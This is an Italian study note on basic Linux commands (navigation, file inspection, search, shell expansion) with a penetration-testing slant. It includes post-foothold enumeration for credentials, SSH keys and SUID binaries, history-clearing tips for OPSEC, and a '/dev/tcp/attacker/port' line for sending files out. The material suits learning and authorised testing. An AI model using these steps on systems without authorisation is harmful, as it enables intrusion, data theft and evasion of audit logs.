---
tipo: entita
tag: [linux]
fase: 1
fonti: 3
aggiornato: 2026-06-26
stato: maturo
aliases: ["Comandi Linux di Base"]

---

# Comandi Linux di Base

## Cos'è

I **comandi Linux di base** sono gli strumenti essenziali per navigare il [[Filesystem Linux]], gestire file e directory, e leggere la documentazione dal terminale. Sono il punto di partenza assoluto per qualunque attività su un sistema Linux — dalla semplice navigazione all'enumerazione offensiva durante un pentest.

---

## Navigazione del filesystem

```bash
pwd                        # Print Working Directory: mostra il percorso corrente
ls                         # lista file e cartelle
ls -la                     # lista lunga (permessi, owner, size) + file nascosti (dotfile)
ls -lah                    # come sopra con size human-readable (K, M, G)
ls -lt                     # ordina per data modifica (più recente in cima)
ls -lS                     # ordina per dimensione (più grande in cima)
cd /etc                    # directory assoluta
cd ..                      # sale di un livello
cd -                       # torna alla directory precedente (utile per saltare avanti/indietro)
cd ~                       # home dell'utente corrente
```

> [!tip] Pentest rapido
> `ls -lat` (long + all + time-sorted) mostra in cima i file **toccati di recente** — utile per rilevare file lasciati da altri attaccanti o modificati dal sistema.

---

## Lettura e ispezione di file

```bash
cat /etc/passwd            # stampa l'intero file su stdout
cat -n file.txt            # stampa con numeri di riga
less file.txt              # paginatore interattivo (q=esci, /=cerca, n=prossima)
more file.txt              # paginatore più semplice (solo avanti)
head -20 file.txt          # prime 20 righe (default: 10)
tail -20 file.txt          # ultime 20 righe
tail -f /var/log/syslog    # segui il file in tempo reale (live log)
wc -l file.txt             # conta le righe
wc -c file.txt             # conta i byte
file /bin/ls               # determina il tipo di file (ELF, ASCII, data...)
strings /bin/ls            # stampa le stringhe ASCII leggibili in un binario
xxd file.bin | head        # dump esadecimale
od -A x -t x1z file.bin   # dump hex alternativo
```

### Differenze chiave: `cat` vs `less` vs `strings`

| Comando | Quando usarlo |
|---------|--------------|
| `cat` | File piccoli, concatenare output, redirect |
| `less` | File grandi: log, output di tool (es. nmap) |
| `strings` | Binari: cercare password hardcoded, path, segreti |
| `file` | Identificare tipo prima di aprire qualcosa di sconosciuto |
| `xxd` | Analisi di file binari, stego, exploit crafting |

---

## Creazione, copia, spostamento, eliminazione

```bash
touch file.txt             # crea file vuoto (o aggiorna timestamp)
mkdir -p percorso/dir      # crea directory (e i genitori se non esistono)
cp file.txt backup.txt     # copia
cp -r dir/ backup/         # copia ricorsiva di directory
mv file.txt /tmp/          # sposta (o rinomina)
rm file.txt                # elimina file (NON va nel cestino)
rm -rf cartella/           # elimina cartella ricorsivamente (IRREVERSIBILE)
ln -s /etc/passwd link.txt # crea un symlink (soft link)
ln /etc/passwd hard.txt    # crea un hard link (stesso inode)
```

> [!warning] `rm -rf`
> Non esiste un "annulla". Su un sistema target in pentest: **non eliminare nulla** senza autorizzazione esplicita — potresti distruggere evidenze o causare danni.

---

## Ricerca di file e contenuto

```bash
find / -name "*.txt" 2>/dev/null          # trova file .txt partendo da /
find /home -user alice 2>/dev/null        # file di proprietà di alice
find / -perm -4000 -type f 2>/dev/null   # tutti i file SUID (vettore di privesc)
find / -writable -type f 2>/dev/null     # file scrivibili dall'utente corrente
find / -mmin -60 -type f 2>/dev/null     # modificati negli ultimi 60 minuti
locate passwd                             # ricerca rapida (usa database, va aggiornato con updatedb)
which python3                             # mostra il path del binario
whereis nmap                              # cerca binario + manuale + sorgenti
type ls                                  # mostra se è builtin, alias o binario
```

---

## Visualizzare informazioni su sistema e utente

```bash
whoami                     # utente corrente
id                         # uid, gid e gruppi
hostname                   # nome dell'host
uname -a                   # kernel, architettura, versione
uname -r                   # solo versione kernel (utile per cercare exploit)
cat /etc/os-release        # distribuzione e versione
cat /proc/version          # versione kernel + compilatore
uptime                     # da quanto è acceso, carico medio
env                        # variabili d'ambiente (possono contenere segreti)
echo $PATH                 # percorsi di ricerca dei binari
echo $SHELL                # shell corrente
```

> [!tip] Pentest — prime 5 righe dopo il foothold
> ```bash
> id; whoami; uname -a; cat /etc/os-release; sudo -l
> ```
> Danno immediatamente contesto su chi sei, quale kernel gira, e se hai sudo.

---

## Rete (comandi base)

```bash
ip a                       # indirizzi IP (moderno, sostituisce ifconfig)
ip r                       # tabella di routing
ss -tlnp                   # porte in ascolto (sostituto di netstat)
netstat -tlnp              # porte in ascolto (vecchio, spesso assente)
cat /etc/hosts             # risoluzione DNS locale
cat /etc/resolv.conf       # server DNS configurato
```

---

## Documentazione integrata: `man`, `--help`, `info`

```bash
man ls                     # manuale completo di ls (q per uscire)
man 5 passwd               # sezione 5 = formati file (es. /etc/passwd)
man -k keyword             # cerca nei titoli dei manali (= apropos)
ls --help                  # aiuto sintetico (spesso più rapido di man)
info coreutils ls          # documentazione GNU completa (più dettagliata di man)
```

### Sezioni del manuale

| Sezione | Contenuto |
|---------|-----------|
| 1 | Comandi utente |
| 2 | System call (kernel) |
| 3 | Funzioni C della libreria standard |
| 4 | File speciali (`/dev`) |
| 5 | Formati file (`/etc/passwd`, `/etc/cron`) |
| 7 | Miscellanea (standard, protocolli) |
| 8 | Comandi amministrativi (root) |

`man 5 passwd` e `man 8 useradd` sono due esempi frequenti in lab.

---

## Trucchi di produttività (shell)

```bash
!!                         # ripete l'ultimo comando
sudo !!                    # ripete l'ultimo con sudo (classico dopo "permission denied")
!nmap                      # ripete l'ultimo comando che inizia con "nmap"
Ctrl+R                     # ricerca interattiva nella history (digita e cerca)
history | grep ssh         # filtra la history per keyword
history -c                 # cancella la history (OPSEC: da fare prima di disconnettersi)
unset HISTFILE             # disabilita la scrittura della history per questa sessione
Tab (x1)                   # autocompletamento path/comando
Tab (x2)                   # mostra tutte le opzioni possibili
Ctrl+A / Ctrl+E            # inizio / fine riga
Ctrl+W                     # cancella parola a sinistra del cursore
Ctrl+L                     # pulisce schermo (equivalente a clear)
```

---

## Espansioni della shell e quoting

Prima di eseguire una riga di comando, bash compie una serie di **espansioni** (capire come "la shell vede il mondo" è essenziale per evitare bug subdoli):

1. **Brace expansion**: `echo {A..D}` → `A B C D`; `file{1,2,3}.txt`.
2. **Tilde expansion**: `~` → home dell'utente; `~bob` → home di bob.
3. **Parameter expansion**: `$USER`, `${HOME}`. Una variabile **non definita** si espande a **stringa vuota** (causa frequente di bug).
4. **Command substitution**: `$(comando)` (o backtick) → l'output del comando viene inserito nella riga.
5. **Arithmetic expansion**: `$((5 * 7))` → `35`.
6. **Pathname expansion** (globbing): `*`, `?`, `[...]` espansi in nomi di file.
7. **Word splitting** e rimozione delle quote.

Il **quoting** controlla quali espansioni avvengono:

| Forma | Effetto |
|-------|---------|
| `"..."` doppi apici | sopprimono globbing e word splitting, ma **consentono** `$`, backtick e `\` |
| `'...'` apici singoli | sopprimono **tutto** (stringa letterale) |
| `\` backslash | esegue l'escape di un singolo carattere |

> [!tip] La singola abitudine che previene più bug
> Quota **sempre** le espansioni di variabili (`"$var"`) quando i valori possono contenere spazi o caratteri speciali — vale anche in modalità interattiva, non solo negli script ([[Bash Scripting]]).

---

## Ambiente e file di startup

L'**ambiente** è l'insieme di variabili e funzioni della sessione:

```bash
set                        # variabili di shell + ambiente + funzioni
printenv                   # solo le variabili d'ambiente
export VAR=valore          # rende VAR disponibile ai processi figli
apropos editor             # cerca comandi per parola chiave (= man -k)
help cd                    # aiuto per i comandi builtin (cd, export, ...)
```

I **file di startup** inizializzano l'ambiente: `/etc/profile` (globale), `~/.bash_profile` (login), `~/.bashrc` (shell interattive). È `~/.bashrc` il file da modificare per alias e funzioni:

```bash
echo "alias ll='ls -lh --color=auto'" >> ~/.bashrc
source ~/.bashrc           # ricarica senza riaprire il terminale (. = source)
```

> [!note] Bash vs altre shell
> Bash resta lo standard de facto sui server. Sul desktop guadagnano terreno **zsh** (default su macOS) e **fish** per le feature interattive (autosuggerimenti, syntax highlighting). Per gli *script*, però, restare su bash/POSIX garantisce portabilità.

---

## Comandi di testo utili in pipeline

```bash
echo "ciao"                # stampa stringa su stdout
printf "%s\n" ciao mondo   # output formattato
cut -d: -f1 /etc/passwd    # estrae il primo campo (delimitatore :)
sort file.txt              # ordina righe
sort -u file.txt           # ordina e rimuove duplicati
uniq -c file.txt           # conta occorrenze consecutive (usare dopo sort)
tr 'a-z' 'A-Z'             # trasforma caratteri (minuscolo → maiuscolo)
tr -d '\r'                 # rimuove carriage return (fix CRLF)
base64 file.txt            # codifica base64 (utile per trasferire file)
base64 -d encoded.txt      # decodifica
```

---

## Uso in pentest: enumerazione rapida

Sequenza pratica dopo aver ottenuto una shell su un target Linux:

```bash
# Chi sono e che privilegi ho?
id; sudo -l 2>/dev/null; groups

# Contesto del sistema
uname -a; cat /etc/os-release; hostname; cat /etc/hosts

# Utenti con shell interattiva (potenziali target di escalation orizzontale)
grep -E '/bin/(ba)?sh$' /etc/passwd | cut -d: -f1

# File interessanti di configurazione e credenziali
ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
find /home -name "*.txt" -o -name "*.sh" -o -name "id_rsa" 2>/dev/null
cat ~/.bash_history 2>/dev/null

# Processi e porte
ps aux
ss -tlnp

# File SUID (vettore privesc)
find / -perm -4000 -type f 2>/dev/null
```

---

## Sicurezza: uso offensivo vs hardening

### Uso offensivo (red team / pentest)
- `strings` su binari per password hardcoded o path assoluti (utili per PATH hijacking).
- `file` per capire il formato prima di tentare un exploit.
- `cat /etc/passwd` per enumerare utenti e shell; `cat ~/.bash_history` per credenziali.
- `find` con `-perm -4000` e `-writable` per trovare vettori di [[Privilege Escalation Linux]].
- `ls -lat` per trovare file toccati di recente da processi privilegiati (cron, servizi).

### Hardening / difesa
- Auditare `history` centralizzata (es. `PROMPT_COMMAND="history -a"` + syslog).
- Evitare di lasciare credenziali in `~/.bash_history`; usare `HISTCONTROL=ignorespace` (con spazio iniziale non salva il comando).
- Limitare `find` con `nosuid,nodev,noexec` sulle partizioni utente.
- `auditd` con watch su `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`.

---

## Casi limite e troubleshooting

1. **`command not found` per un binario presente** → controlla `echo $PATH`; il binario può stare in `/sbin` o `/usr/sbin` non incluse nel PATH dell'utente normale. Usa il path assoluto.
2. **`ls` non mostra file nascosti** → manca `-a`; i file che iniziano con `.` (`.bashrc`, `.ssh/`) sono nascosti per convenzione, non per sicurezza.
3. **`rm` non rimuove un file con carattere speciale nel nome** → usa `rm -- -nomestrano` o `rm ./-nomestrano` per evitare che venga interpretato come flag.
4. **`cat` di un file binario corrompe il terminale** → il terminale interpreta sequenze di escape; esegui `reset` o `tput reset` per ripristinarlo. Preferisci `strings` o `xxd` per i binari.
5. **`tail -f` su log non aggiornato** → il processo scrive su un file descriptor già aperto e ha fatto ruotare il log; usa `tail -F` (maiuscolo) che segue anche i rename.

---

## Domande da esame / colloquio

> **D: Differenza tra hard link e symlink?**
> Un **hard link** punta allo stesso inode del file originale: se cancelli l'originale, i dati restano finché esiste almeno un hard link. Un **symlink** (soft link) è un file separato che contiene il percorso dell'originale: se l'originale sparisce, il symlink è rotto ("dangling link"). I hard link non possono attraversare filesystem diversi né puntare a directory.

> **D: Cosa mostra `ls -la` che `ls` non mostra?**
> `-l` aggiunge formato lungo (permessi, numero hard link, owner, group, size, timestamp); `-a` include i file nascosti (dotfile, `.` e `..`). Insieme sono il punto di partenza obbligato in ogni nuova directory su un sistema target.

> **D: Come trovi rapidamente a quale utente appartiene un processo?**
> `ps aux` mostra la colonna USER per ogni processo. Alternativa moderna: `ps -eo pid,user,comm`. Per un pid specifico: `cat /proc/<PID>/status | grep -i uid`.

> **D: Perché `sudo !!` è utile in pentest?**
> Se un comando fallisce con "permission denied", `!!` recupera il comando dalla history e `sudo` lo rilancia con privilegi root — evita di riscriverlo. In pentest è utile anche per capire subito se l'utente ha sudo senza password su quel binario.

> **D: Come trasferisci un file su un target senza strumenti come `scp` o `wget`?**
> `base64 file && echo` lato attaccante, poi `echo <stringa_base64> | base64 -d > file` lato target. Alternativa: `cat file > /dev/tcp/attacker/port` (Bash built-in `/dev/tcp`).

---

## Collegamenti

- [[Filesystem Linux]]
- [[Permessi Linux]]
- [[Pipe e Redirezione]]
- [[grep]]
- [[find]]
- [[Enumerazione]]
- [[OverTheWire Bandit]]
- [[Bash Scripting]]
- [[Utenti e Gruppi Linux]]
- [[Privilege Escalation Linux]]

## Fonti

- The Linux Command Line (W. Shotts, gratuito online): https://linuxcommand.org/tlcl.php
- TLCL — cap. 7 "Seeing the World as the Shell Sees It" (espansioni e quoting), cap. 11 "The Environment"
- Man page ls: https://man7.org/linux/man-pages/man1/ls.1.html
